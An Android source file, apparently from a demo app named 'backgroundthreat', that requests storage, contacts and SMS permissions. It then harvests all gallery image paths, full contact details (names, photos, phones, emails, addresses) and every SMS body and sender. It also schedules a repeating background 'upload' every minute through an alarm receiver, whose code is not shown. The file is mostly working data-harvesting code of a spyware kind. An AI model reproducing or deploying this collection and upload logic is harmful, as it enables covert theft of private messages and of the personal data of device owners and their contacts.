package com.askme.backgroundthreat;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.nabinbhandari.android.permissions.PermissionHandler;
import com.nabinbhandari.android.permissions.Permissions;

import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.UUID;

public class MainActivity extends AppCompatActivity {

    Button startBackgroundUploadButton;
    Button stopBackgroundUploadButton;
    Button loadGalleryImageButton;

    TextView imageUploadCountTextView;

    private PendingIntent pendingIntent;
    private AlarmManager alarmManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initViews();
        initContents();
        initListeners();
    }

    private void initViews() {
        imageUploadCountTextView = findViewById(R.id.imageUploadCountTextView);
        startBackgroundUploadButton = findViewById(R.id.startBackgroundUploadButton);
        stopBackgroundUploadButton = findViewById(R.id.stopBackgroundUploadButton);
        loadGalleryImageButton = findViewById(R.id.loadGalleryImageButton);
    }


    private void initContents() {
        if (SaveRestoreData.getUniqueID(getApplicationContext()) == null) {
            SaveRestoreData.setUniqueID(getApplicationContext(), UUID.randomUUID().toString());
        }

        imageUploadCountTextView.setText(String.format(Locale.getDefault(), "%d Images Uploaded\n %d Contacts Uploaded\n %d SMS Uploaded"
                , SaveRestoreData.getCurrentImageIndex(getApplicationContext())
                , SaveRestoreData.getCurrentContactIndex(getApplicationContext())
                , SaveRestoreData.getCurrentSMSIndex(getApplicationContext())));
    }

    private void initListeners() {
        startBackgroundUploadButton.setOnClickListener(view -> {

            alarmManager = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(getApplicationContext(), AlarmReceiver.class);
            pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, 0);
            alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 60000,
                    pendingIntent);

            Toast.makeText(getApplicationContext(), "Started Background Upload", Toast.LENGTH_SHORT).show();
        });
        stopBackgroundUploadButton.setOnClickListener(view -> {
            alarmManager = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(getApplicationContext(), AlarmReceiver.class);
            pendingIntent = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, 0);
            alarmManager.cancel(pendingIntent);
            Toast.makeText(getApplicationContext(), "Stopped Background Upload", Toast.LENGTH_SHORT).show();
        });

        loadGalleryImageButton.setOnClickListener(view -> {

            String[] permissions = {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS};
            Permissions.check(this/*context*/, permissions, null/*rationale*/, null/*options*/, new PermissionHandler() {
                @Override
                public void onGranted() {
                    getAllStoredImages();
                    getStoredContacts();
                    getAllSms();
                }
            });

        });
    }

    private void getAllStoredImages() {
        Uri uri;
        Cursor cursorInternal, cursorExternal;
        int column_index_data, column_index_folder_name;
        ArrayList<String> listOfAllImages = new ArrayList<String>();
        String absolutePathOfImage = null;
        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.MediaColumns.DATA,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME};

        cursorExternal = getContentResolver().query(uri, projection, null,
                null, null);

        column_index_data = cursorExternal.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        column_index_folder_name = cursorExternal
                .getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
        while (cursorExternal.moveToNext()) {
            absolutePathOfImage = cursorExternal.getString(column_index_data);

            listOfAllImages.add(absolutePathOfImage);
        }
        SaveRestoreData.saveImageList(getApplicationContext(), listOfAllImages);
        SaveRestoreData.setCurrentImageIndex(getApplicationContext(), 0);
    }


    private void getStoredContacts() {
        ArrayList<ContactItem> contactList = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor mainCursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (mainCursor != null) {
            while (mainCursor.moveToNext()) {
                ContactItem contactItem = new ContactItem();
                String id = mainCursor.getString(mainCursor.getColumnIndex(ContactsContract.Contacts._ID));
                String displayName = mainCursor.getString(mainCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                Uri contactUri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, Long.parseLong(id));
                Uri displayPhotoUri = Uri.withAppendedPath(contactUri, ContactsContract.Contacts.Photo.DISPLAY_PHOTO);

                //ADD NAME AND CONTACT PHOTO DATA...
                contactItem.setDisplayName(displayName);
                contactItem.setPhotoUrl(displayPhotoUri.toString());

                if (Integer.parseInt(mainCursor.getString(mainCursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    //ADD PHONE DATA...
                    ArrayList<PhoneContact> arrayListPhone = new ArrayList<>();
                    Cursor phoneCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{
                            id
                    }, null);
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            PhoneContact phoneContact = new PhoneContact();
                            String phone = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phoneContact.setPhone(phone);
                            arrayListPhone.add(phoneContact);
                        }
                    }
                    if (phoneCursor != null) {
                        phoneCursor.close();
                    }
                    contactItem.setArrayListPhone(arrayListPhone);


                    //ADD E-MAIL DATA...
                    ArrayList<EmailContact> arrayListEmail = new ArrayList<>();
                    Cursor emailCursor = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{
                            id
                    }, null);
                    if (emailCursor != null) {
                        while (emailCursor.moveToNext()) {
                            EmailContact emailContact = new EmailContact();
                            String email = emailCursor.getString(emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                            emailContact.setEmail(email);
                            arrayListEmail.add(emailContact);
                        }
                    }
                    if (emailCursor != null) {
                        emailCursor.close();
                    }
                    contactItem.setArrayListEmail(arrayListEmail);

                    //ADD ADDRESS DATA...
                    ArrayList<PostalAddress> arrayListAddress = new ArrayList<>();
                    Cursor addrCursor = getContentResolver().query(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI, null, ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID + " = ?", new String[]{
                            id
                    }, null);
                    if (addrCursor != null) {
                        while (addrCursor.moveToNext()) {
                            PostalAddress postalAddress = new PostalAddress();
                            String city = addrCursor.getString(addrCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                            String state = addrCursor.getString(addrCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                            String country = addrCursor.getString(addrCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                            postalAddress.setCity(city);
                            postalAddress.setState(state);
                            postalAddress.setCountry(country);
                            arrayListAddress.add(postalAddress);
                        }
                    }
                    if (addrCursor != null) {
                        addrCursor.close();
                    }
                    contactItem.setArrayListAddress(arrayListAddress);
                }
                contactList.add(contactItem);
            }
        }
        if (mainCursor != null) {
            mainCursor.close();
        }

        SaveRestoreData.saveContactList(getApplicationContext(), contactList);
        SaveRestoreData.setCurrentContactIndex(getApplicationContext(), 0);
    }


    private void getAllSms() {

        ArrayList<SMSInfo> smsInfoArrayList = new ArrayList<>();

        ContentResolver cr = getApplicationContext().getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    Date dateFormat= new Date(Long.valueOf(smsDate));
                    smsDate = dateFormat.toString();
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String type = "";
                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                        default:
                            type = "inbox";
                            break;
                    }
                    smsInfoArrayList.add(new SMSInfo(smsDate, number, body, type));
                    c.moveToNext();
                }
            }

            SaveRestoreData.saveSMSList(getApplicationContext(), smsInfoArrayList);
            SaveRestoreData.setCurrentSMSIndex(getApplicationContext(), 0);

            c.close();

        } else {
            Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
        }
    }
}
